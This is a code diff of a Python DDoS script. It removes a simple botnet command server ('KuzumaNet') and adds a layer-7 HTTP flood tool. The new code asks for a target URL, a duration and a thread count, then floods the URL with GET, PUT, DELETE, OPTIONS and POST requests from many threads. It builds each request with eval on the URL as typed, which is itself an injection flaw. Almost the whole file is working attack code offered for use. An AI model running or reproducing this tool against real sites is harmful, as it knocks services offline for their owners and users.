@@ -23,166 +23,104 @@ print("""\033[93m
                DDoS Layer7 (DDoS) 💥
 """)
 print()
-import sys
-from sys import platform
+
 import os
-import socket
-import subprocess
-import time
-from time import sleep
-import colorama
-from colorama import Style, Fore 
-import threading as thread
-import _thread
+import requests
+from tqdm import tqdm
+from sys import version
+from threading import Thread
+from colorama import init, Fore, Back, Style
 
+version = "5"
 
-osystem = sys.platform
+loop = tqdm(total = 1000, position=0, leave=False)
+for k in range(1000):
+    loop.set_description(f'{Fore.RED}[IV]{Fore.RESET} Loading.....'.format(k))
+    loop.update(1)
+loop.close()    
+os.system('cls') 
 
-if osystem == "linux":
-    os.system("clear")
-else:
-    os.system("cls")
- 
- 
-welcome ="""
-        Welcome to Kuzuma Network
-------------------------------------------
-"""
-time.sleep(1.7)
-if osystem == "linux":
-    os.system("clear")
-
-else:
-    os.system("cls")
-
-server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-print("""
-KuzumaNet
-DDoS Botnet
-Discord: zSodex#3828 :D""")
-
-time.sleep(1.3)
-os.system("clear")
-print(Fore.RED+"""
- ██ ▄█▀ █    ██ ▒███████▒ █    ██  ███▄ ▄███▓ ▄▄▄      
- ██▄█▒  ██  ▓██▒▒ ▒ ▒ ▄▀░ ██  ▓██▒▓██▒▀█▀ ██▒▒████▄    
-▓███▄░ ▓██  ▒██░░ ▒ ▄▀▒░ ▓██  ▒██░▓██    ▓██░▒██  ▀█▄  
-▓██ █▄ ▓▓█  ░██░  ▄▀▒   ░▓▓█  ░██░▒██    ▒██ ░██▄▄▄▄██  
-▒██▒ █▄▒▒█████▓ ▒███████▒▒▒█████ ▒██▒   ░██▒ ▓█   ▓██▒
-▒ ▒▒ ▓▒░▒▓▒ ▒ ▒ ░▒▒ ▓░▒░▒░▒▓▒ ▒ ▒ ░ ▒░   ░  ░ ▒▒   ▓▒█░░ 
-░ ░▒ ▒░░░▒░ ░ ░ ░░▒ ▒ ░ ▒░░▒░ ░ ░ ░  ░      ░  ▒   ▒▒ ░░ ░
-░ ░░ ░  ░░░ ░ ░ ░ ░ ░ ░ ░ ░░░ ░ ░ ░      ░     ░   ▒      ░  
-░  ░      ░       ░ ░       ░            ░         ░  ░         
-                ░                                              
-""")
-time.sleep(3.3)
-os.system("clear")
-print(Fore.BLUE + "DDoS Botnet By zSodex :D ")
-print()
-listclientes = []
-
-
-
-def zombies():
-    
-    bots = 0 
-    for bots in listclientes:
-        bots =+1
-        print(f"[+] Bots: {bots}")
-
-
-
-
-def clientes(client_addr):
-     
-    
-    print(Fore.BLUE + f"[+] {client_addr[0]} | Just connected to Kuzuma")
-    print()
-    while True:
-
-        if comm.startswith ("attack"):
-            attack()
-        if comm == "bots":
-            zombies()
-
-        if comm == " ":
-            pass
-        if comm == ".":
-            pass
-
-        if comm == "exit":
-            for bots in listclientes:
-                comm = comm.encode()
-                bots.send(comm)
-                salida()
-             
-
+def menu():
+    print(f'''     
+{Fore.LIGHTRED_EX} ██╗██╗░░░██╗
+{Fore.LIGHTRED_EX} ██║██║░░░██║ 
+{Fore.LIGHTRED_EX} ██║╚██╗░██╔╝ 
+{Fore.LIGHTRED_EX} ██║░╚████╔╝░
+{Fore.LIGHTRED_EX} ██║░░╚██╔╝░░
+{Fore.LIGHTRED_EX} ╚═╝░░░╚═╝░░░
             
+              {Fore.RED}╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
+              {Fore.RED}│  	IV  : {version}  │
+              {Fore.RED}╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
+    {Fore.RESET} ''')
 
- 
-        for bots in listclientes:
-            comm = comm.encode()
-            bots.send(comm)
+menu()
 
-        
+def menu2(): 
+    print(f'''    
+{Fore.LIGHTRED_EX} ██╗██╗░░░██╗
+{Fore.LIGHTRED_EX} ██║██║░░░██║ 
+{Fore.LIGHTRED_EX} ██║╚██╗░██╔╝ 
+{Fore.LIGHTRED_EX} ██║░╚████╔╝░
+{Fore.LIGHTRED_EX} ██║░░╚██╔╝░░
+{Fore.LIGHTRED_EX} ╚═╝░░░╚═╝░░░
+                                                Version : {version}
+                                    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 
+                                      ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+    {Fore.RESET} ''')
 
-def salida():
-    print("[+] Bots in listening again, thanks for using Kuzuma :D  ")
-    print("[*] Press CTRL-C to close the program!")
-            
-        
+global url, time, file
+url     =     input(f'{Fore.LIGHTGREEN_EX}╰──────| URL FOR ATTACK |──────> {Fore.BLUE}')
+print(f'')
+time    = int(input(f'{Fore.LIGHTGREEN_EX}╰──────| TIMEING ATTACK |──────> {Fore.BLUE} '))
+print(f'')
+threads = int(input(f'{Fore.LIGHTGREEN_EX}╰──────| GHODRAT|──────> {Fore.BLUE}'))
+print('')
 
+loop = tqdm(total = 1000, position=0, leave=False)
+for k in range(1000):
+    loop.set_description(f'{Fore.RED}[IV]{Fore.RESET} Waiting To Run SOURCE ........'.format(k))
+    loop.update(1)
+loop.close()    
+os.system('cls') 
 
-def attack():
-    print(f"[+] Order sent to all zombies, be patient!")
-def crtserver():
-    global server
-    from colorama import Style, Fore 
-    lhost = input(Fore.RED + Style.BRIGHT + "[+] Enter server IP: => " )
-    print()
-    lport = int(input("[+] Enter server port: => "))
-    #lport = 4444
+menu2()
 
-    
+global breakFlag
+breakFlag = False
 
-    if lhost == "":
-        lhost == 'localhost'
-        pass
+print(f'{Fore.RED} Sending Packet to : {Fore.GREEN}{url}')
 
-    try:
+def attack(request):
+	global url, time, file
+	i = 0
+	while True:
+		try:
+			req = eval("requests."+request+"('"+url+"')")
+			print(f'{Fore.RED} Sending Atack To {Fore.BLUE}{url} {Fore.RED}Thread : {Fore.GREEN}{threads}')
+		except:
+			print(f'{Fore.RED} Atack Has Ben Errored')
+		i+=1
+		if time != 0:
+			if i>time:
+				break
 
-        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        server.bind((lhost, lport))
-        server.listen()
-        print()
-        print("[+] Waiting For Bots Handshake...")
-    except KeyboardInterrupt:
-        server.close()
-         
-        
+def createThreadings():
+	global breakFlag
+	try:
+		Thread(target=lambda: attack("get")).start()
+		Thread(target=lambda: attack("put")).start()
+		Thread(target=lambda: attack("delete")).start()
+		Thread(target=lambda: attack("options")).start()
+		Thread(target=lambda: attack("post")).start()
+	except:
+		breakFlag = True
 
-     
-    while True:
-        try:
-            clientt, client_addr = server.accept()
-            _thread.start_new_thread(clientes, (client_addr,))
-            listclientes.append(clientt)
-            try:
-
-                output = clientt.recv(1024)
-                output = output.decode()
-                print(f"""
-                {output}""")
-                 
-            except:
-                pass
-
-
-        except KeyboardInterrupt:
-            print()
-            print("Byee!")
-            server.close()
-            break
- 
-
-crtserver()
+if(threads != 0):
+	for i in range(threads):
+		createThreadings()
+else:
+	while True:
+		createThreadings()
+		if(breakFlag):
+			break
